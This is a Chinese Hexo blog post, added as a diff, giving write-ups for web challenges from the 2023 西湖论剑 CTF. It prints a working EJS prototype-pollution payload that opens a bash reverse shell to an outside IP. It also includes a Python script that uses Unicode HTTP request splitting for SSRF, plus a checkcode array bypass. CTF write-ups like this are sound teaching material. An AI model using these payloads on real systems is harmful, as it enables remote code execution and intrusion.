@@ -1,0 +1,625 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="2023西湖论剑部分web" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            2023西湖论剑部分web
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#real-ez-node"><span class="post-toc-text">real_ez_node</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x02 题解</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="post-toc-text">0x03 参考连接</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Node-Magical-Login"><span class="post-toc-text">Node Magical Login</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-1"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3-1"><span class="post-toc-text">0x02 题解</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E6%89%AD%E8%BD%AC%E4%B9%BE%E5%9D%A4"><span class="post-toc-text">扭转乾坤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-2"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x01 题解</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="post-toc-text">0x02 参考连接</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#unusual-php"><span class="post-toc-text">unusual php</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-3"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3-2"><span class="post-toc-text">0x02 题解</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5-1"><span class="post-toc-text">0x03 参考连接</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="real-ez-node"><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ul>
+<li>通过拆分http进行ssrf</li>
+<li>原型链污染利用ejs进行rce</li>
+</ul>
+<h2 id="0x01-源码分析"><a href="#0x01-源码分析" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><p>此处代码存在原型链污染</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><code>__proto__</code>被禁用，可以使用<code>constructor.prototype</code>进行污染</p>
+<p>而<code>safeobj.expand</code>的使用方式和pydash很像</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022046304.png" title="image-20230202204604203" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022046304.png" alt="image-20230202204604203"></a></p>
+<p>然后他后面接着使用了<code>res.render</code>，且使用的模板引擎是ejs，所以可以利用原型链污染来触发任意代码执行</p>
+<p>但是这里需要本地访问，再看下一个路由</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// 任何 2xx 状态码都表示成功响应，但这里只检查 200。</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// 消费响应数据以释放内存</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这里他会进行http访问，因为题目使用的node版本为node:8.1.2，所以可以通过unicode来拆分http数据包进行ssrf</p>
+<p>就是利用CRLF来让一个<code>http.get()</code>发送多个数据包，这样就可以进行ssrf了</p>
+<h2 id="0x02-题解"><a href="#0x02-题解" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p>首先是原型链污染的payload,在给&#x2F;copy传参是时候这样传</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.prototype.outputFunctionName=a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \<span class="string">&quot;bash -i &gt;%26 /dev/tcp/110.40.xxx.xxx/9999 0&gt;%261\&quot;&#x27;);var __tmp2</span></span><br></pre></td></tr></table></figure>
+
+<p>然后是http拆分进行ssrf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;1 HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /copy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Length: 195</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">constructor.prototype.outputFunctionName=a; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;%26 /dev/tcp/110.40.xxx.xxx/9999 0&gt;%261\&quot;&#x27;);var __tmp2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/curl?q=&#x27;</span> + (urllib.parse.quote(payload)))</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以获得shell</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022102959.png" title="image-20230202210227901" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022102959.png" alt="image-20230202210227901"></a></p>
+<h2 id="0x03-参考连接"><a href="#0x03-参考连接" class="headerlink" title="0x03 参考连接"></a>0x03 参考连接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">通过拆分攻击实现的SSRF攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241429#h2-4">NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击</a></li>
+<li><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></li>
+</ul>
+<h1 id="Node-Magical-Login"><a href="#Node-Magical-Login" class="headerlink" title="Node Magical Login"></a>Node Magical Login</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><ul>
+<li>逻辑漏洞</li>
+</ul>
+<h2 id="0x01-源码分析-1"><a href="#0x01-源码分析-1" class="headerlink" title="0x01 源码分析"></a>0x01 源码分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Flag1Controller</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="variable constant_">SECRET_COOKIE</span>)&#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>,flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag2&quot;</span>,flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Login success. Welcome,admin!&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            res.<span class="title function_">setHeader</span>(<span class="string">&quot;This_Is_The_Flag1&quot;</span>, flag1.<span class="title function_">toString</span>().<span class="title function_">trim</span>())</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Unauthorized&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只要cookie里的user值为admin就行获得一部分flag</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">CheckController</span>(<span class="params">req,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span>?req.<span class="property">body</span>.<span class="property">checkcode</span>:<span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span>(checkcode.<span class="property">length</span> === <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span>(checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>)&#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode&#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (__) &#123;&#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;You Got Another Part Of Flag: &quot;</span> + flag2.<span class="title function_">toString</span>().<span class="title function_">trim</span>()&#125;)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123;<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有个坑，当时看了半天没出来，这里看起来是需要让checkcode.toLowerCase()得到的值为aGr5AtSp55dRacer才能获得flag</p>
+<p>其实只要让checkcode.toLowerCase()报错，这样就会直接进入catch分支，就不会进行<code>checkcode !== &quot;aGr5AtSp55dRacer&quot;</code>的判断</p>
+<p>最后执行到<code>res.status(200).type(&quot;text/html&quot;).json(&#123;&quot;msg&quot;:&quot;You Got Another Part Of Flag: &quot; + flag2.toString().trim()&#125;)</code>得到flag2</p>
+<p>又因为有个对长度的判断，如果是数组的话，checkcode.length得到的就是元素的个数，所以只要传元素有16个的数组就行</p>
+<h2 id="0x02-题解-1"><a href="#0x02-题解-1" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p>先获得flag1</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022114452.png" title="image-20230202211457373" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302022114452.png" alt="image-20230202211457373"></a></p>
+<p>然后获得flag2</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;checkcode&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="string">&quot;1&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
